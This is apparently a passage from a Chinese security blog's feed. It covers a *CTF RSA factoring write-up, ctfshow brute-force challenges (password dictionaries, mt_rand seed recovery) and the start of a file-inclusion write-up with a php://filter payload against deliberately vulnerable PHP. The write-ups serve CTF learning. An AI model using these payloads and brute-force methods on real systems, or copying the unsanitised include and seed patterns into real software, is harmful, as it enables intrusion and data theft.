class="line">weight = [<span class="number">60</span>, <span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.average(a, weights=weight))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [  0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16  17</span></span><br><span class="line"><span class="comment">#   18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35</span></span><br><span class="line"><span class="comment">#   36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53</span></span><br><span class="line"><span class="comment">#   54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71</span></span><br><span class="line"><span class="comment">#   72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89</span></span><br><span class="line"><span class="comment">#   90  91  92  93  94  95  96  97  98  99 100]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  5050</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  50.0</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  29.154759474226502</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  69.33333333333333</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  69.33333333333333</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  73.6</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="读取保存">读取保存</span></h3><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1651143123748.png" alt="1651143123748"></p><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1651143400346.png" alt="1651143400346"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#numpy&quot;&gt;numpy&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#官方文档-httpsnumpyorgdocstablereference&quot;&gt;官方文档 https://numpy.org/doc/stable/r</summary>
      
    
    
    
    <category term="python" scheme="http://zzuzyj.github.io/categories/python/"/>
    
    
    <category term="numpy" scheme="http://zzuzyj.github.io/tags/numpy/"/>
    
  </entry>
  
  <entry>
    <title>星CTF_EZrsa</title>
    <link href="http://zzuzyj.github.io/2022/05/03/CTF_EZrsa/"/>
    <id>http://zzuzyj.github.io/2022/05/03/CTF_EZrsa/</id>
    <published>2022-05-03T09:23:29.901Z</published>
    <updated>2022-04-22T10:42:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ezrsa">EZrsa</span></h1><h2><span id="题目">题目</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime</span><br><span class="line"><span class="keyword">from</span> gmpy <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">p=getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q=next_prime(p^((<span class="number">1</span>&lt;&lt;<span class="number">900</span>)-<span class="number">1</span>)^getrandbits(<span class="number">300</span>))</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"> </span><br><span class="line">m=<span class="built_in">int</span>(flag.encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span> m&lt;n</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="comment">#0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"><span class="comment">#0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1bea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52ff2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2><span id="题目分析amp解答">题目分析&amp;解答</span></h2><p>p是1024位的随机素数，q=next_prime(p^((1&lt;&lt;900)-1)^getranbits(300)),即q是p异或1&lt;&lt;900-1再异或一个300bits的随机数的下一个素数</p><p>根据异或的性质，我们可以很容易得知p和q的高124位是相同的，而且n=p*q，且n是已经知道的</p><p>拆分p,q,</p><script type="math/tex; mode=display">p=p_{high}*2^{900}+p_{low}\\q=q_{high}*2^{900}+q_{low}\\令x=p_{high},则x也等于q_{high}\\p_{low}+q_{low}=2^{900}-1+cc,cc是300位随机数异或后的改变量，相对较小，当然不是真的小。\\n=p*q(2^{1800}*x^2+2^{900}*x(p_{low}+q_{low})\\+p_{low}*q_{low})=2^{1800}*x^2+2^{1800}*x+smallnum,两边//2^{1800}得到\\n//2^{1800}=x^2+x,x可解</script><p>直接开根可得x</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n=<span class="number">0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span></span><br><span class="line">nn=n//(<span class="number">2</span>**<span class="number">1800</span>)</span><br><span class="line"><span class="built_in">print</span>(iroot(nn,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#20226195070633070235386534147535171929</span></span><br></pre></td></tr></table></figure><p>即x=20226195070633070235386534147535171929,</p><p>接下来就是如何求p,q了，由于p+q为定值，可知若p==q，p*q越大，当p,q越不相近p,q越小，再根据n，我们可以求出,p,q的大概值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">20226195070633070235386534147535171929</span></span><br><span class="line">p = x&lt;&lt;<span class="number">900</span> | (<span class="number">2</span>**<span class="number">900</span> - <span class="number">1</span>)</span><br><span class="line">q = x&lt;&lt;<span class="number">900</span></span><br><span class="line"><span class="comment"># Start from 125th bits (1024-125)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">899</span>, <span class="number">301</span>, -<span class="number">1</span>):</span><br><span class="line">    cur = <span class="number">1</span>&lt;&lt;i</span><br><span class="line">    <span class="keyword">if</span> (p^^cur) * (q^^cur) &lt; n:</span><br><span class="line">      p^^= cur </span><br><span class="line">      q^^= cur</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p))</span><br></pre></td></tr></table></figure><p>由性质可知p的大概值和真实的p存在差异，但是具体不知道，然后可以继续进行爆破，截取一部分足够的高位进行coppersmith爆破，</p><p>我们直接截取coppersmith所能爆破的最大限度，如果还没结果就寄吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">n = </span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f=x+p</span><br><span class="line">roots=f.small_roots(X=<span class="number">2</span>**<span class="number">430</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">p=<span class="built_in">int</span>(p+roots[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">assert</span> n%p==<span class="number">0</span></span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># *CTF&#123;St.Diana_pls_take_me_with_you!&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ezrsa&quot;&gt;EZrsa&lt;/span&gt;&lt;/h1&gt;&lt;h2&gt;&lt;span id=&quot;题目&quot;&gt;题目&lt;/span&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s</summary>
      
    
    
    
    <category term="Crypto" scheme="http://zzuzyj.github.io/categories/Crypto/"/>
    
    
    <category term="RSA" scheme="http://zzuzyj.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow爆破入门</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/</id>
    <published>2022-05-03T09:23:29.896Z</published>
    <updated>2022-04-27T12:23:34.000Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#web21">web21</a></li><li><a href="#web22">web22</a></li><li><a href="#web23">web23</a></li><li><a href="#web24">web24</a></li><li><a href="#web25">web25</a></li><li><a href="#web26">web26</a></li><li><a href="#web27">web27</a></li><li><a href="#web28">web28</a></li></ul><!-- tocstop --><h1><span id="web21">web21</span></h1><p>拿到题目给的字典，抓一下包</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1650540592603.png" alt="1650540592603"></p><p>看的群主大大的wp，太菜了，这里一定不要打对号</p><p>可以成功爆破拿到flag</p><h1><span id="web22">web22</span></h1><p>子域名爆破</p><p>在线网站 phpinfo.me/domain</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1650980340576.png" alt="1650980340576"></p><p>这flag藏的我直呼好家伙</p><h1><span id="web23">web23</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接把条件语句拉到本地跑一遍，得到两个数字符合条件</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1650981337227.png" alt="1650981337227"></p><p>传入拿到flag</p><h1><span id="web24">web24</span></h1><p>又是一个假的爆破题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随机种子直接告诉我们了，，，生成的随机数是不变的，直接在本地跑一次拿到随机数，传入参数拿到flag</p><h1><span id="web25">web25</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br></pre></td></tr></table></figure><p>逻辑分析 传入?r=0可以得到 随机数的负值，然后可以用工具脚本跑出随机种子</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1650982566153.png" alt="1650982566153"></p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1650982642704.png" alt="1650982642704"></p><p>用插件识别php版本，发现用0xcfcf14188较为合适，本地测试发现也对得上，继续往下走</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure><p>本地输出跑一下写入cookie</p><p>。。。。发现flag出不来</p><p>更改了几次随机种子，最后还是拿到了flag</p><h1><span id="web26">web26</span></h1><p>类似21</p><p>直接爆破就可以了</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651047552375.png" alt="1651047552375"></p><p>成功拿到flag</p><h1><span id="web27">web27</span></h1><p>找到一个附件</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651048312025.png" alt="1651048312025"></p><p>又发现一个学号查询</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651048296792.png" alt="1651048296792"></p><p>生成字典直接爆破中间八位数字，我用的是c++</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">freopen</span>(<span class="string">&quot;mima.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1990</span>;i&lt;=<span class="number">2010</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">12</span>;j++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">31</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%02d%02d\n&quot;</span>,i,j,k);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651048791159.png" alt="1651048791159"></p><p>爆破成功，解码拿到学号，登录拿到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651049193929.png" alt="1651049193929"></p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651049578215.png" alt="1651049578215"></p><h1><span id="web28">web28</span></h1><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651049676906.png" alt="1651049676906"></p><p>是否发现目录有些问题</p><p>burp爆破一波</p><p>得到/72/20时候返回200</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651051415660.png" alt="1651051415660"></p><p>访问得到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/1651051361798.png" alt="1651051361798"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#web21&quot;&gt;web21&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web22&quot;&gt;web22&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web23&quot;&gt;web23&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
    <category term="爆破" scheme="http://zzuzyj.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow文件包含</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-05-03T09:23:29.890Z</published>
    <updated>2022-04-28T06:51:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="web78">web78</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易想到文件读取</p><p>盲猜测一波flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>有回显，解码得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;206aa53e-8465-4269-a340-1a0a08eae9a4&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1><span id="web79">web79</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span 